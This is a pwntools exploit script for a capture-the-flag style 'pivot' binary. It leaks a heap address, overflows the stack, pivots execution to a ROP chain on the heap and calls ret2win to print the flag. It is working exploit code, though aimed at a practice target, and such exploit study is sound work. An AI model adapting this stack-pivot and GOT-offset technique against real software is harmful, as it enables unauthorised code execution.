from pwn import *
import re

pop_rax = p64(0x0000000000400b00)         # pop rax; ret;
xchg_rax_rsp = p64(0x0000000000400b02)    # xchg rax, rsp; ret;
mov_rax_ptr_rax = p64(0x0000000000400b05) # mov rax, qword ptr [rax]; ret;
jmp_rax = p64(0x00000000004008f5)         # jmp rax;
pop_rbp = p64(0x0000000000400900)         # pop rbp; ret;
add_rax_rbp = p64(0x0000000000400b09)     # add rax, rbp; ret;
call_rax = p64(0x000000000040098e)        # call rax;
pop_rdi = p64(0x0000000000400b73)         # pop rdi; ret;

ret2win = 0x7ffff7bd3abe
foothold = 0x7ffff7bd3970

# 0x0000000000400850 <+0>:  jmp    QWORD PTR [rip+0x2017f2]        # 0x602048
# jump here first to resolve symbols.
foothold_plt = p64(0x0000000000400850)

foothold_got = p64(0x602048)
offset = p64(ret2win - foothold)

hexreg = "0[xX][0-9a-fA-F]+"

def JumpToHeap(heap_addr):
  ret  = ""
  ret += pop_rax
  ret += p64(heap_addr)
  ret += xchg_rax_rsp
  return ret

def CallRet2win():
  ret  = ""

  # Call foothold to resolve address
  ret += foothold_plt

  # Now address is resolved, we can dereference the pointer to it, add offset and call/jmp
  ret += pop_rax
  ret += foothold_got
  ret += mov_rax_ptr_rax
  ret += pop_rbp
  ret += offset
  ret += add_rax_rbp
  ret += call_rax
  return ret

elf = ELF('pivot')

io = process(elf.path)

# get leaked heap address
leaked = io.recvuntil("> ")
m = re.search(hexreg, leaked)
pls = m.group()
heap = int(pls, 16)

pad = 'A'*40

info("heap addr: " + hex(heap))

# for stack
rops = pad + JumpToHeap(heap)

# for heap
roph = CallRet2win()

io.sendline(roph)
leaked = io.recvuntil("> ")

io.sendline(rops)

# Get flag
recv = io.recvall()
log.success(recv)